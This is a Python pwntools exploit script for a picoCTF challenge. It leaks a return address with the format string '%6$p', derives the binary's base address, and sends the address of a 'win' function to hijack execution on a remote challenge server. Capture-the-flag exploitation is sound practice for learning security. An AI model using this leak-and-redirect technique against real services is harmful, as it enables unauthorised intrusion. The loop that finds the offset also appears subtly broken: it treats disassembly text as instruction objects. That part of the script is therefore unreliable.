from pwn import *

# This allows you to switch between local and remote
# process = process("./vuln") # For local testing
process = remote("rescued-float.picoctf.net", 60493) # Make sure this port is current

# Use pwntools to get the offsets from the ELF file
elf = ELF("./vuln")

# The address leaked by %6$p is the return address for the call_functions() call
# inside of main(). We can find the offset of this return address dynamically.
# 1. Find the address of the 'main' function.
# 2. Find the address of the 'call call_functions' instruction within main.
# 3. The return address is the address of the instruction immediately after the call.
leaked_addr_offset = 0
for instruction in elf.disasm(elf.symbols['main'], 0x100): # Disassemble 0x100 bytes of main
    if 'call' in instruction.opstr and 'call_functions' in instruction.opstr:
        # The leaked address is the return address, which is the address
        # of the instruction immediately following the 'call'.
        leaked_addr_offset = instruction.address + instruction.size
        break

process.recvuntil(b"Enter your name:")
process.sendline(b"%6$p")
leaked_addr = int(process.recvline().strip(), 16)

elf.address = leaked_addr - leaked_addr_offset
win_address = elf.symbols['win']

log.info(f"Leaked Address: {hex(leaked_addr)}")
log.info(f"ELF Base Address: {hex(elf.address)}")
log.info(f"Win Function Address: {hex(win_address)}")

process.recvuntil(b"ex => 0x12345: ")
process.sendline(str(hex(win_address)).encode())

process.interactive()